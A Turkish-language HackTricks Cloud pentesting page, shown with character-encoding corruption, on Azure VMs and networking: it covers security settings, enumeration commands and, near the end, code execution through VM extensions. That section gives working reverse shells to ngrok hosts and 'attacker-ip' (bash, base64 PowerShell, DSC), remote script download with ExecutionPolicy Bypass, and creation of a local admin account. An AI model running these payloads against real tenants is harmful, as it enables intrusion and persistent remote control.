# Az - Sanal Makineler & AÄŸ

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Azure AÄŸ Temel Bilgileri

Azure aÄŸlarÄ± **farklÄ± varlÄ±klar ve yapÄ±landÄ±rma yollarÄ± iÃ§erir.** FarklÄ± Azure aÄŸ varlÄ±klarÄ±nÄ±n kÄ±sa **tanÄ±mlarÄ±,** **Ã¶rnekleri** ve **numaralandÄ±rma** komutlarÄ±nÄ± bulabilirsiniz:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Sanal Makineler Temel Bilgileri

Azure Sanal Makineleri (VM'ler), Windows veya Linux iÅŸletim sistemlerini Ã§alÄ±ÅŸtÄ±rmanÄ±za olanak tanÄ±yan esnek, talep Ã¼zerine **bulut tabanlÄ± sunuculardÄ±r**. Fiziksel donanÄ±m yÃ¶netmeden uygulamalarÄ± ve iÅŸ yÃ¼klerini daÄŸÄ±tmanÄ±za olanak tanÄ±r. Azure VM'leri, belirli ihtiyaÃ§larÄ± karÅŸÄ±lamak ve sanal aÄŸlar, depolama ve gÃ¼venlik araÃ§larÄ± gibi Azure hizmetleriyle entegre olmak iÃ§in Ã§eÅŸitli CPU, bellek ve depolama seÃ§enekleriyle yapÄ±landÄ±rÄ±labilir.

### GÃ¼venlik YapÄ±landÄ±rmalarÄ±

* **KullanÄ±labilirlik AlanlarÄ±**: KullanÄ±labilirlik alanlarÄ±, belirli bir Azure bÃ¶lgesindeki fiziksel olarak ayrÄ±lmÄ±ÅŸ veri merkezi gruplarÄ±dÄ±r ve yerel kesintiler veya felaketlerden birden fazla alanÄ±n etkilenme riskini en aza indirmek iÃ§in tasarlanmÄ±ÅŸtÄ±r.
* **GÃ¼venlik TÃ¼rÃ¼**:
* **Standart GÃ¼venlik**: Bu, herhangi bir Ã¶zel yapÄ±landÄ±rma gerektirmeyen varsayÄ±lan gÃ¼venlik tÃ¼rÃ¼dÃ¼r.
* **GÃ¼venilir BaÅŸlatma**: Bu gÃ¼venlik tÃ¼rÃ¼, Secure Boot ve Sanal GÃ¼venilir Platform ModÃ¼lÃ¼ (vTPM) kullanarak Ã¶nyÃ¼kleme kitleri ve Ã§ekirdek dÃ¼zeyindeki kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlara karÅŸÄ± korumayÄ± artÄ±rÄ±r.
* **Gizli VM'ler**: GÃ¼venilir baÅŸlatmanÄ±n Ã¼zerine, VM, hipervizÃ¶r ve ana yÃ¶netim arasÄ±nda donanÄ±m tabanlÄ± izolasyon sunar, disk ÅŸifrelemesini geliÅŸtirir ve [**daha fazlasÄ±**](https://learn.microsoft.com/en-us/azure/confidential-computing/confidential-vm-overview)**.**
* **Kimlik DoÄŸrulama**: VarsayÄ±lan olarak yeni bir **SSH anahtarÄ± oluÅŸturulur**, ancak bir genel anahtar kullanmak veya Ã¶nceki bir anahtarÄ± ve varsayÄ±lan olarak **azureuser** olan kullanÄ±cÄ± adÄ±nÄ± kullanmak mÃ¼mkÃ¼ndÃ¼r. AyrÄ±ca **ÅŸifre** kullanacak ÅŸekilde yapÄ±landÄ±rmak da mÃ¼mkÃ¼ndÃ¼r.
* **VM disk ÅŸifrelemesi:** Disk, varsayÄ±lan olarak platform yÃ¶netilen bir anahtar kullanÄ±larak dinlenme durumunda ÅŸifrelenir.
* **Ana bilgisayarda Åifreleme**'yi etkinleÅŸtirmek de mÃ¼mkÃ¼ndÃ¼r; burada veriler, depolama hizmetine gÃ¶nderilmeden Ã¶nce ana bilgisayarda ÅŸifrelenir ve ana bilgisayar ile depolama hizmeti arasÄ±nda uÃ§tan uca ÅŸifreleme saÄŸlanÄ±r ([**docs**](https://learn.microsoft.com/en-gb/azure/virtual-machines/disk-encryption#encryption-at-host---end-to-end-encryption-for-your-vm-data)).
* **NIC aÄŸ gÃ¼venlik grubu**:
* **HiÃ§biri**: Temelde her portu aÃ§ar
* **Temel**: HTTP (80), HTTPS (443), SSH (22), RDP (3389) gelen portlarÄ±nÄ± kolayca aÃ§ar
* **GeliÅŸmiÅŸ**: Bir gÃ¼venlik grubu seÃ§in
* **Yedekleme**: **Standart** yedeklemeyi (gÃ¼nde bir) ve **GeliÅŸmiÅŸ** (gÃ¼nde birden fazla) etkinleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r.
* **YamanÄ±n orkestrasyon seÃ§enekleri**: Bu, [**docs**](https://learn.microsoft.com/en-us/azure/virtual-machines/automatic-vm-guest-patching) 'da aÃ§Ä±klandÄ±ÄŸÄ± gibi seÃ§ilen politikaya gÃ¶re VM'lerde yamalarÄ±n otomatik olarak uygulanmasÄ±nÄ± saÄŸlar.
* **UyarÄ±lar**: VM'de bir ÅŸey olduÄŸunda otomatik olarak e-posta veya mobil uygulama ile uyarÄ± almak mÃ¼mkÃ¼ndÃ¼r. VarsayÄ±lan kurallar:
* CPU YÃ¼zdesi %80'den bÃ¼yÃ¼k
* KullanÄ±labilir Bellek BaytlarÄ± 1GB'den az
* Veri Diskleri IOPS TÃ¼ketilen YÃ¼zdesi %95'ten bÃ¼yÃ¼k
* OS IOPS TÃ¼ketilen YÃ¼zdesi %95'ten bÃ¼yÃ¼k
* Toplam AÄŸ 500GB'den bÃ¼yÃ¼k
* Toplam AÄŸ Ã‡Ä±kÄ±ÅŸÄ± 200GB'den bÃ¼yÃ¼k
* VmAvailabilityMetric 1'den az
* **SaÄŸlÄ±k monitÃ¶rÃ¼**: VarsayÄ±lan olarak port 80'de HTTP protokolÃ¼nÃ¼ kontrol eder
* **Kilitleme**: Bir VM'yi yalnÄ±zca okunabilir (**ReadOnly** kilidi) veya okunabilir ve gÃ¼ncellenebilir ancak silinemez (**CanNotDelete** kilidi) hale getirmek iÃ§in kilitlemeyi saÄŸlar.
* Ã‡oÄŸu VM ile ilgili kaynaklar **kilitleri de destekler**; diskler, anlÄ±k gÃ¶rÃ¼ntÃ¼ler...
* Kilitler **kaynak grubu ve abonelik seviyelerinde** de uygulanabilir.

## Diskler & anlÄ±k gÃ¶rÃ¼ntÃ¼ler

* **2 veya daha fazla VM'ye bir disk eklemeyi etkinleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r**
* VarsayÄ±lan olarak her disk **ÅŸifrelenmiÅŸtir** ve bir platform anahtarÄ± ile korunmaktadÄ±r.
* AnlÄ±k gÃ¶rÃ¼ntÃ¼lerde de aynÄ± durum geÃ§erlidir.
* VarsayÄ±lan olarak, diskin **tÃ¼m aÄŸlardan paylaÅŸÄ±lmasÄ±** mÃ¼mkÃ¼ndÃ¼r, ancak yalnÄ±zca belirli **Ã¶zel eriÅŸim** ile **tamamen devre dÄ±ÅŸÄ± bÄ±rakÄ±lacak** ÅŸekilde de **kÄ±sÄ±tlanabilir**.
* AnlÄ±k gÃ¶rÃ¼ntÃ¼lerde de aynÄ± durum geÃ§erlidir.
* **Diskin dÄ±ÅŸa aktarÄ±lmasÄ±** iÃ§in bir SAS URI (maksimum 60 gÃ¼n) **oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r**, bu da kimlik doÄŸrulama gerektirip gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±labilir.
* AnlÄ±k gÃ¶rÃ¼ntÃ¼lerde de aynÄ± durum geÃ§erlidir.
```bash
# List all disks
az disk list --output table

# Get info about a disk
az disk show --name <disk-name> --resource-group <rsc-group>
```
## GÃ¶rseller, Galeri GÃ¶rselleri ve Geri YÃ¼kleme NoktalarÄ±

Bir **VM gÃ¶rÃ¼ntÃ¼sÃ¼**, **yeni bir sanal makine (VM)** oluÅŸturmak iÃ§in gereken iÅŸletim sistemi, uygulama ayarlarÄ± ve dosya sistemi iÃ§eren bir ÅŸablondur. Bir gÃ¶rÃ¼ntÃ¼ ile bir disk anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼ arasÄ±ndaki fark, bir disk anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n yalnÄ±zca yedekleme veya sorun giderme iÃ§in kullanÄ±lan, tek bir yÃ¶netilen diskin okunamayan, belirli bir zamandaki kopyasÄ± olmasÄ±dÄ±r; oysa bir gÃ¶rÃ¼ntÃ¼ **birden fazla diski iÃ§erebilir ve yeni VM'ler oluÅŸturmak iÃ§in bir ÅŸablon olarak hizmet vermek Ã¼zere tasarlanmÄ±ÅŸtÄ±r**.\
GÃ¶rÃ¼ntÃ¼ler, Azure'un **GÃ¶rÃ¼ntÃ¼ler bÃ¶lÃ¼mÃ¼** veya **Azure hesap galerileri** iÃ§inde yÃ¶netilebilir; bu, **sÃ¼rÃ¼mler** oluÅŸturmayÄ± ve gÃ¶rÃ¼ntÃ¼yÃ¼ tenantlar arasÄ± paylaÅŸmayÄ± veya hatta herkese aÃ§Ä±k hale getirmeyi saÄŸlar.

Bir **geri yÃ¼kleme noktasÄ±**, VM yapÄ±landÄ±rmasÄ±nÄ± ve VM'ye baÄŸlÄ± olan **tÃ¼m yÃ¶netilen disklerin** **belirli bir zamandaki** uygulama tutarlÄ± **anlÄ±k gÃ¶rÃ¼ntÃ¼lerini** saklar. Bu, VM ile iliÅŸkilidir ve amacÄ±, o VM'yi o belirli zamandaki durumuna geri yÃ¼kleyebilmektir.
```bash
# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shaerd with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>
```
## Azure Site Recovery

[**docs**](https://learn.microsoft.com/en-us/azure/site-recovery/site-recovery-overview) sayfasÄ±ndan: Site Recovery, iÅŸ sÃ¼rekliliÄŸini saÄŸlamak iÃ§in iÅŸ uygulamalarÄ±nÄ± ve yÃ¼klerini kesintiler sÄ±rasÄ±nda Ã§alÄ±ÅŸÄ±r durumda tutmaya yardÄ±mcÄ± olur. Site Recovery, fiziksel ve sanal makinelerde (VM'ler) Ã§alÄ±ÅŸan yÃ¼kleri birincil bir yerden ikincil bir yere **Ã§oÄŸaltÄ±r**. Bir kesinti meydana geldiÄŸinde, birincil yerden ikincil bir yere geÃ§iÅŸ yapar ve uygulamalara oradan eriÅŸirsiniz. Birincil yer tekrar Ã§alÄ±ÅŸmaya baÅŸladÄ±ÄŸÄ±nda, geri geÃ§iÅŸ yapabilirsiniz.

## Azure Bastion

Azure Bastion, sanal makinelerinize (VM'ler) Azure Portal Ã¼zerinden veya bir jump box aracÄ±lÄ±ÄŸÄ±yla gÃ¼venli ve kesintisiz **Remote Desktop Protocol (RDP)** ve **Secure Shell (SSH)** eriÅŸimi saÄŸlar. VM'lerinizde **genel IP adreslerine ihtiyaÃ§ duymayÄ± ortadan kaldÄ±rarak** bunu gerÃ§ekleÅŸtirir.&#x20;

Bastion, Ã§alÄ±ÅŸmasÄ± gereken VNet iÃ§inde `/26` alt aÄŸ maskesine sahip **`AzureBastionSubnet`** adÄ±nda bir alt aÄŸ daÄŸÄ±tÄ±r. ArdÄ±ndan, VM'lerin portlarÄ±nÄ± internete aÃ§madan `RDP` ve `SSH` kullanarak tarayÄ±cÄ± Ã¼zerinden iÃ§ VM'lere **baÄŸlanmanÄ±za** olanak tanÄ±r. AyrÄ±ca bir **jump host** olarak da Ã§alÄ±ÅŸabilir.

AboneliÄŸinizdeki tÃ¼m Azure Bastion Host'larÄ±nÄ± listelemek ve bunlar aracÄ±lÄ±ÄŸÄ±yla VM'lere baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutlarÄ± kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
# List bastions
az network bastion list -o table

# Connect via SSH through bastion
az network bastion ssh \
--name MyBastion \
--resource-group MyResourceGroup \
--target-resource-id /subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM \
--auth-type ssh-key \
--username azureuser \
--ssh-key ~/.ssh/id_rsa

# Connect via RDP through bastion
az network bastion rdp \
--name <BASTION_NAME> \
--resource-group <RESOURCE_GROUP> \
--target-resource-id /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Compute/virtualMachines/<VM_NAME> \
--auth-type password \
--username <VM_USERNAME> \
--password <VM_PASSWORD>
```
{% endcode %}

## Metadata

Azure Instance Metadata Service (IMDS) **Ã§alÄ±ÅŸan sanal makine Ã¶rnekleri hakkÄ±nda bilgi saÄŸlar** yÃ¶netim ve yapÄ±landÄ±rmalarÄ±na yardÄ±mcÄ± olmak iÃ§in. SKU, depolama, aÄŸ yapÄ±landÄ±rmalarÄ± ve yaklaÅŸan bakÄ±m olaylarÄ± hakkÄ±nda bilgiler gibi detaylar sunar **REST API ile 169.254.169.254 adresinde bulunan yÃ¶nlendirilemeyen IP adresi Ã¼zerinden**, bu yalnÄ±zca VM iÃ§inden eriÅŸilebilir. VM ile IMDS arasÄ±ndaki iletiÅŸim ana bilgisayar iÃ§inde kalÄ±r, gÃ¼venli eriÅŸimi saÄŸlar. IMDS'yi sorgularken, VM iÃ§indeki HTTP istemcileri doÄŸru iletiÅŸimi saÄŸlamak iÃ§in web proxy'lerini atlamalÄ±dÄ±r.

AyrÄ±ca, metadata uÃ§ noktasÄ±na ulaÅŸmak iÃ§in HTTP isteÄŸinin **`Metadata: true`** baÅŸlÄ±ÄŸÄ±na sahip olmasÄ± ve **`X-Forwarded-For`** baÅŸlÄ±ÄŸÄ±na sahip olmamasÄ± gerekir.

Bunu nasÄ±l listeleyeceÄŸinizi kontrol edin:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-vm" %}

## VM Enumeration

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# VMs
## List all VMs and get info about one
az vm list --output table
az vm show --name <came> --resource-group <rsc-group>

## List all available VM images and get info about one
az vm image list --all --output table

# VM Extensions
## List all VM extensions
az vm extension image list --output table

## Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table

## List extensions in a VM
az vm extension list -g <rsc-group> --vm-name <vm-name>

## List managed identities in a VM
az vm identity show \
--resource-group <rsc-group> \
--name <vm-name>

# Disks
## List all disks and get info about one
az disk list --output table
az disk show --name <disk-name> --resource-group <rsc-group>

# Snapshots
## List all galleries abd get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all snapshots and get info about one
az snapshot list --output table
az snapshot show --name <name> --resource-group <rsc-group>

# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shared with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>

# Bastion
## list all bastions
az network bastion list -o table

# Network
## List VNets
az network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"

## List subnets of a VNet
az network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table

## List public IPs
az network public-ip list --output table

## Get NSG rules
az network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table

## Get NICs and subnets using this NSG
az network nsg show --name MyLowCostVM-nsg --resource-group Resource_Group_1 --query "{subnets: subnets, networkInterfaces: networkInterfaces}"

## List all Nics & get info of a single one
az network nic list --output table
az network nic show --name <name> --resource-group <rsc-group>

## List Azure Firewalls
az network firewall list --query "[].{name:name, location:location, subnet:subnet, publicIp:publicIp}" -o table

## Get network rules of a firewall
az network firewall network-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get application rules of a firewall
az network firewall application-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get nat rules of a firewall
az network firewall nat-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## List Route Tables
az network route-table list --query "[].{name:name, resourceGroup:resourceGroup, location:location}" -o table

## List routes for a table
az network route-table route list --route-table-name <RouteTableName> --resource-group <ResourceGroupName> --query "[].{name:name, addressPrefix:addressPrefix, nextHopType:nextHopType, nextHopIpAddress:nextHopIpAddress}" -o table

# Misc
## List all virtual machine scale sets
az vmss list --output table

## List all availability sets
az vm availability-set list --output table

## List all load balancers
az network lb list --output table

## List all storage accounts
az storage account list --output table

## List all custom script extensions on a specific VM
az vm extension list --vm-name <vm-name> --resource-group <resource-group>

# Show boot diagnostics settings for a specific VM
az vm boot-diagnostics get-boot-log --name <vm-name> --resource-group <resource-group>

## List all tags on virtual machines
az resource list --resource-type "Microsoft.Compute/virtualMachines" --query "[].{Name:name, Tags:tags}" --output table

# List all available run commands for virtual machines
az vm run-command list --output table
```
{% endcode %}
{% endtab %}

{% tab title="Az PS" %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
{% endtab %}
{% endtabs %}

## VMs'de Kod Ã‡alÄ±ÅŸtÄ±rma

### VM UzantÄ±larÄ±

Azure VM uzantÄ±larÄ±, Azure sanal makinelerinde (VM'lerde) **daÄŸÄ±tÄ±m sonrasÄ± yapÄ±landÄ±rma** ve otomasyon gÃ¶revleri saÄŸlayan kÃ¼Ã§Ã¼k uygulamalardÄ±r.

Bu, **VM'ler iÃ§inde rastgele kod Ã§alÄ±ÅŸtÄ±rmayÄ±** mÃ¼mkÃ¼n kÄ±lar.

Gerekli izin **`Microsoft.Compute/virtualMachines/extensions/write`**'dir.

TÃ¼m mevcut uzantÄ±larÄ± listelemek mÃ¼mkÃ¼ndÃ¼r:
```bash
# It takes some mins to run
az vm extension image list --output table

# Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table
```
Ã–zel kod Ã§alÄ±ÅŸtÄ±ran **Ã¶zel uzantÄ±lar Ã§alÄ±ÅŸtÄ±rmak mÃ¼mkÃ¼ndÃ¼r**:

{% tabs %}
{% tab title="Linux" %}
* Ters bir shell Ã§alÄ±ÅŸtÄ±rÄ±n

{% code overflow="wrap" %}
```bash
# Prepare the rev shell
echo -n 'bash -i  >& /dev/tcp/2.tcp.eu.ngrok.io/13215 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ==

# Execute rev shell
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{}' \
--protected-settings '{"commandToExecute": "nohup echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ== | base64 -d | bash &"}'
```
{% endcode %}

* Ä°nternette bulunan bir scripti Ã§alÄ±ÅŸtÄ±rÄ±n

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/8ce279967be0855cc13aa2601402fed3/raw/72816c3603243cf2839a7c4283e43ef4b6048263/hacktricks_touch.sh"]}' \
--protected-settings '{"commandToExecute": "sh hacktricks_touch.sh"}'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
* Ters bir shell Ã§alÄ±ÅŸtÄ±rÄ±n

{% code overflow="wrap" %}
```bash
# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Execute it
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{}' \
--protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}'

```
{% endcode %}

* Dosyadan ters kabuk Ã§alÄ±ÅŸtÄ±r

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/33b6d1a80421694e85d96b2a63fd1924/raw/d0ef31f62aaafaabfa6235291e3e931e20b0fc6f/ps1_rev_shell.ps1"]}' \
--protected-settings '{"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File ps1_rev_shell.ps1"}'
```
{% endcode %}

AyrÄ±ca ÅŸu gibi diÄŸer yÃ¼kleri de Ã§alÄ±ÅŸtÄ±rabilirsiniz: `powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add`

* VMAccess uzantÄ±sÄ±nÄ± kullanarak ÅŸifreyi sÄ±fÄ±rlama

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Ä°lgili VM uzantÄ±larÄ±

Gerekli izin hala **`Microsoft.Compute/virtualMachines/extensions/write`**.

<details>

<summary>VMAccess uzantÄ±sÄ±</summary>

Bu uzantÄ±, Windows VM'ler iÃ§indeki kullanÄ±cÄ±larÄ±n ÅŸifresini deÄŸiÅŸtirmeye (veya yoksa oluÅŸturmasÄ±na) olanak tanÄ±r.

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}

</details>

<details>

<summary>DesiredConfigurationState (DSC)</summary>

Bu, Azure Windows VM'lerinin yapÄ±landÄ±rmasÄ±nÄ± yÃ¶netmek iÃ§in PowerShell DSC kullanan Microsoft'a ait bir **VM uzantÄ±sÄ±**dÄ±r. Bu nedenle, bu uzantÄ± aracÄ±lÄ±ÄŸÄ±yla Windows VM'lerinde **rastgele komutlar** Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir:
```powershell
# Content of revShell.ps1
Configuration RevShellConfig {
Node localhost {
Script ReverseShell {
GetScript = { @{} }
SetScript = {
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',attacker-port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length)
}
$client.Close()
}
TestScript = { return $false }
}
}
}
RevShellConfig -OutputPath .\Output

# Upload config to blob
$resourceGroup = 'dscVmDemo'
$storageName = 'demostorage'
Publish-AzVMDscConfiguration `
-ConfigurationPath .\revShell.ps1 `
-ResourceGroupName $resourceGroup `
-StorageAccountName $storageName `
-Force

# Apply DSC to VM and execute rev shell
$vmName = 'myVM'
Set-AzVMDscExtension `
-Version '2.76' `
-ResourceGroupName $resourceGroup `
-VMName $vmName `
-ArchiveStorageAccountName $storageName `
-ArchiveBlobName 'revShell.ps1.zip' `
-AutoUpdate `
-ConfigurationName 'RevShellConfig'
```
</details>

<details>

